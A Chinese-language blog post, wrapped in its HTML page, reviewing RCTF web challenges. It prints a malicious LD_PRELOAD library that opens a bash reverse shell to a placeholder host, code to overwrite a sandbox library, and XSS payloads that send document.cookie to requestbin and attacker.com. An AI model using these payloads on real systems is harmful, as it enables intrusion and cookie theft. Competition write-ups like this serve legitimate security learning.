@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言RCTF如何评价，只能说坐大牢，我还是太弱了，做出一道题已经是拼尽全力   RootKB打LD_PRELOAD劫持就好了  首先本地开个环境，发现在&#x2F;admin&#x2F;tool处存在python代码执行，但是在沙箱环境下调试启动之后成功执行返回2沙箱环境下的限制是没有&#x2F;bin&#x2F;sh，以及一些黑名单，如system,exec,eval等等，且需要提权才可以读取&#x2F;root&#x2F;flag目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rctf后感">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言RCTF如何评价，只能说坐大牢，我还是太弱了，做出一道题已经是拼尽全力   RootKB打LD_PRELOAD劫持就好了  首先本地开个环境，发现在&#x2F;admin&#x2F;tool处存在python代码执行，但是在沙箱环境下调试启动之后成功执行返回2沙箱环境下的限制是没有&#x2F;bin&#x2F;sh，以及一些黑名单，如system,exec,eval等等，且需要提权才可以读取&#x2F;root&#x2F;flag目">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251117115131643.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251117115631936.png">
+<meta property="article:published_time" content="2025-11-20T14:15:06.000Z">
+<meta property="article:modified_time" content="2025-11-20T14:45:13.478Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="复现">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251117115131643.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>rctf后感</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/rctf-maybe-easy/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/Polar%E6%9D%AFjava%E9%83%A8%E5%88%86%E8%A7%A3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&text=rctf后感"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&is_video=false&description=rctf后感"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=rctf后感&body=Check out this article: https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&name=rctf后感&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&t=rctf后感"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RootKB"><span class="toc-number">2.</span> <span class="toc-text">RootKB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RootKB%E2%80%93"><span class="toc-number">3.</span> <span class="toc-text">RootKB–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Auth"><span class="toc-number">4.</span> <span class="toc-text">Auth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Author"><span class="toc-number">5.</span> <span class="toc-text">Author</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AuthorPlus"><span class="toc-number">6.</span> <span class="toc-text">AuthorPlus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#photographer"><span class="toc-number">7.</span> <span class="toc-text">photographer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hyperfun"><span class="toc-number">8.</span> <span class="toc-text">hyperfun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#maybe-easy"><span class="toc-number">9.</span> <span class="toc-text">maybe_easy</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        rctf后感
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-20T14:15:06.000Z" class="dt-published" itemprop="datePublished">2025-11-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RCTF如何评价，只能说坐大牢，我还是太弱了，做出一道题已经是拼尽全力  </p>
+<h2 id="RootKB"><a href="#RootKB" class="headerlink" title="RootKB"></a>RootKB</h2><p>打LD_PRELOAD劫持就好了  首先本地开个环境，发现在<code>/admin/tool</code>处存在python代码执行，但是在沙箱环境下<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251117115131643.png"><br>调试启动之后成功执行返回<code>2</code><br>沙箱环境下的限制是没有<code>/bin/sh</code>，以及一些黑名单，如system,exec,eval等等，且需要提权才可以读取&#x2F;root&#x2F;flag<br>目前可以做到列目录<code>os.listdir(&quot;/&quot;)</code>，但是可读写只能在沙盒目录下<code>/opt/maxkb-app/sandbox</code><br>我们发现这个目录下有一个sandbox.so文件<br>我们审计源码，尤其是2.3.0-&gt;2.3.1变化的部分，新增了一处   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -<span class="number">188</span>,<span class="number">6</span> +<span class="number">194</span>,<span class="number">9</span> @@ exec(<span class="params">&#123;dedent(<span class="params">code</span>)!a&#125;</span>)</span></span><br><span class="line">                     <span class="variable language_">self</span>.user,</span><br><span class="line">                 ],</span><br><span class="line">                 <span class="string">&#x27;cwd&#x27;</span>: <span class="variable language_">self</span>.sandbox_path,</span><br><span class="line">+                <span class="string">&#x27;env&#x27;</span>: &#123;</span><br><span class="line">+                    <span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;self.sandbox_path&#125;</span>/sandbox.so&#x27;</span>,</span><br><span class="line">+                &#125;,</span><br><span class="line">                 <span class="string">&#x27;transport&#x27;</span>: <span class="string">&#x27;stdio&#x27;</span>,</span><br><span class="line">             &#125;</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">@@ -<span class="number">204</span>,<span class="number">6</span> +<span class="number">213</span>,<span class="number">9</span> @@ exec(<span class="params">&#123;dedent(<span class="params">code</span>)!a&#125;</span>)</span></span><br><span class="line">             file.write(_code)</span><br><span class="line">             os.system(<span class="string">f&quot;chown <span class="subst">&#123;self.user&#125;</span>:root <span class="subst">&#123;exec_python_file&#125;</span>&quot;</span>)</span><br><span class="line">         kwargs = &#123;<span class="string">&#x27;cwd&#x27;</span>: BASE_DIR&#125;</span><br><span class="line">+        kwargs[<span class="string">&#x27;env&#x27;</span>] = &#123;</span><br><span class="line">+            <span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;self.sandbox_path&#125;</span>/sandbox.so&#x27;</span>,</span><br><span class="line">+        &#125;</span><br><span class="line">         subprocess_result = subprocess.run(</span><br><span class="line">             [<span class="string">&#x27;su&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, python_directory, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&quot;exec(open(&#x27;&quot;</span> + exec_python_file + <span class="string">&quot;&#x27;).read())&quot;</span>, <span class="variable language_">self</span>.user],</span><br><span class="line">             text=<span class="literal">True</span>,</span><br></pre></td></tr></table></figure></div>
+<p>可以看到，假使我们可以覆盖sandbox.so，就可以打LD_PRELOAD劫持，且是高权限了<br>反弹shell的.so文件的编译生成  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void payload() &#123;</span><br><span class="line">system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/x.x.x.x/4444 0&gt;&amp;1&#x27;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int strncmp(const char *__s1, const char *__s2, size_t __n) &#123;</span><br><span class="line">if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br><span class="line">def payload():</span><br><span class="line">    import base64</span><br><span class="line">    import os</span><br><span class="line">    malicious_so_b64=&quot;xxxx&quot;</span><br><span class="line">    malicious_data = base64.b64decode(malicious_so_b64)</span><br><span class="line">    with open(&quot;/opt/maxkb-app/sandbox/sandbox.so&quot;, &quot;wb&quot;) as f:</span><br><span class="line">        f.write(malicious_data)  </span><br><span class="line">    return &quot;sandbox.so replaced successfully&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>成功替换之后<code>os.popen(&quot;&quot;)</code>即可触发反弹shell<br><code>cat /root/flag</code>即可<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251117115631936.png"></p>
+<h2 id="RootKB–"><a href="#RootKB–" class="headerlink" title="RootKB–"></a>RootKB–</h2><p>好像有多个思路，其中之一是打redis，相关的值得一学 </p>
+<p>这里居然是打pickle，redis与xxx之间以pickle进行通信，自然存在pickle反序列化行为<br>当然上述漏洞的发掘需要对通信有些了解，我没有怎么打过redis，且框架代码太多了，看晕了给<br>找个时间看看Redis应该如何去打<br><code>apps\maxkb\settings\lib.py </code><br><code>apps\common\cache\mem_cache.py</code></p>
+<p>这些文件里有类似的逻辑<br>定义了redis与celery之间用pickle序列化数据进行通信<br>这道题的方法很多，能看到的就有三种</p>
+<h2 id="Auth"><a href="#Auth" class="headerlink" title="Auth"></a>Auth</h2><p>代审真的看不下去了哎，整个结构没摸清()  </p>
+<h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p>真爱的xss猛的被刺我，这个js防护到底如何绕过呢？<br>题目出的挺好的，哎，好好审计一下前端php看看，注意，我们平时经常遭遇CSP来限制我们的xss，你知道它的两种启用方法吗？ </p>
+<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure></div>
+
+<p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p>
+<blockquote>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>审计可得，username可控且在meta标签里面<br><code>&lt;meta name=&quot;author&quot; content=&lt;?php echo $pageAuthor; ?&gt;&gt;</code>  </p>
+<p>有一说一，header.php里我都没看到啥内容哎<br>这里存在注入，我们可以弄上CSP玩玩<br>注意，前面被转义了，但是单引号不会被转义，可打 <code> username=&#39;script-src-elem http://localhost:8081/assets/js/article.js&#39; http-equiv=&#39;Content-Security-Policy&#39;</code><br>仅允许我们的innerHTML生效<br>即可打xss了，这里可以不用srcdoc了，直接事件触发打外带了吧<br>script-src-elem的好处指定script执行的有效来源  </p>
+<p>success~</p>
+<p>至于标题简介啥的被转义的细节就不说了，只能在content处写入innerHTML里  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>很遗憾的是这个不会执行，违反script-src-elem了<br>直接事件触发吧</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://requestbin.cn:80/xn8if2xn&quot;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以拿到flag<br>并且上述其实我们可以直接在username进行所有的xss注入，这也反映在了Plus上面</p>
+<h2 id="AuthorPlus"><a href="#AuthorPlus" class="headerlink" title="AuthorPlus"></a>AuthorPlus</h2><p>这道Plus对username做了一定的WAF<br><code>preg_match(&#39;/&gt;\\&#39;&quot;\\x20\\t\\r\\n]/&#39;,$username)</code><br>但是存在用两种符号进行绕过换行，进行payload分隔处理</p>
+<ul>
+<li>%0b,垂直方向制表符</li>
+<li>%0c,换页符</li>
+</ul>
+<p>由于Plus将innerHTML去除了，所以只能利用换行在username处进行注入<br>但是无疑这里有转义处理，不能带尖括号<br>这里注意bot的点击行为  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (auditBtn) &#123;</span><br><span class="line">    await Promise.all([</span><br><span class="line">        auditBtn.click(),</span><br><span class="line">        page.waitForNavigation(&#123; waitUntil: &#x27;domcontentloaded&#x27; &#125;),</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let rejectBtn = null;</span><br><span class="line">try &#123;</span><br><span class="line">    rejectBtn = await page.waitForSelector(&#x27;.btn-reject&#x27;, &#123; visible: true, timeout: 5000 &#125;);</span><br><span class="line">&#125; catch (err) &#123;&#125;</span><br><span class="line">if (rejectBtn) &#123;</span><br><span class="line">    await rejectBtn.click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里admin实现自动reject文章了<br>存在点击行为<br>再配合我们的事件，即可触发js代码，绕过尖括号  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src-elem%0bhttp:blog-app/assets/js/article.js%0chttp-equiv=Content-Security-Policy%0cpopover%0cid=x%0conbeforetoggle=location.href=`http:attacker.com:1234/?c=$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure></div>
+
+<p>这俩题挺xss的，想象力还是不太够哇，大体能体会到了</p>
+<h2 id="photographer"><a href="#photographer" class="headerlink" title="photographer"></a>photographer</h2><p>最高解的题，一定是有一块我没反应过来，太失败了  </p>
+<p>在ai交互的过程中，其实ai已经发现了关键点，就是可以利用上传的post伪造type为-1，然后sql在进行查询时会以post的type代替user的type，进而实现的绕过，通过superadmin.php获得flag<br>为什么没有做出来呢？当时记得很清楚，就是改变Content-type之后无法上传图片，这个问题当时没有细究  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (Auth : check() &amp; Auth : type() &lt; $user_types[&#x27;admin&#x27;]) &#123;</span><br><span class="line">	echo getenv(&#x27;FLAG&#x27;) ?: &#x27;RCTF&#123;test_flag&#125;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里正常路径也不可能小于0了<br>看tupe()之后的查询方法 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static function findById($userId) &#123;</span><br><span class="line">    return DB::table(&#x27;user&#x27;)</span><br><span class="line">        -&gt;leftJoin(&#x27;photo&#x27;, &#x27;user.background_photo_id&#x27;, &#x27;=&#x27;, &#x27;photo.id&#x27;)</span><br><span class="line">        -&gt;where(&#x27;user.id&#x27;, &#x27;=&#x27;, $userId)</span><br><span class="line">        -&gt;first();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这⾥⽤了leftJoin连表查询photo。但是user表和photo表都有 type。其中 user.type 是权限等级， photo.type 是⽂件的 MIME;framework&#x2F;DB.php 这⾥可以看到使⽤SQLite 的fetchArray并且模式为SQLITE3_ASSOC<br>也就是返回以列名索引的数组<br>还是那句话，上传图片并设置背景之后，查询时它的type就覆盖了user的type<br>按理来说就不难了，应该出了吧<br>当时没有考虑<code>csrf_token</code><br>因此出现上传问题<br>注意带上csrf_token就可以正常上传伪造type的图片了  </p>
+<ul>
+<li>考点：sql连表查询时可能会存在覆盖漏洞</li>
+</ul>
+<h2 id="hyperfun"><a href="#hyperfun" class="headerlink" title="hyperfun"></a>hyperfun</h2><p>出乎意料的一处反序列化接口，hyperfun的链子挖掘<br>后续可能单开学习</p>
+<h2 id="maybe-easy"><a href="#maybe-easy" class="headerlink" title="maybe_easy"></a>maybe_easy</h2><p>java题，解较少，但感觉很值得复现学习<br>会单开学习 </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RootKB"><span class="toc-number">2.</span> <span class="toc-text">RootKB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RootKB%E2%80%93"><span class="toc-number">3.</span> <span class="toc-text">RootKB–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Auth"><span class="toc-number">4.</span> <span class="toc-text">Auth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Author"><span class="toc-number">5.</span> <span class="toc-text">Author</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AuthorPlus"><span class="toc-number">6.</span> <span class="toc-text">AuthorPlus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#photographer"><span class="toc-number">7.</span> <span class="toc-text">photographer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hyperfun"><span class="toc-number">8.</span> <span class="toc-text">hyperfun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#maybe-easy"><span class="toc-number">9.</span> <span class="toc-text">maybe_easy</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&text=rctf后感"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&is_video=false&description=rctf后感"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=rctf后感&body=Check out this article: https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&title=rctf后感"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
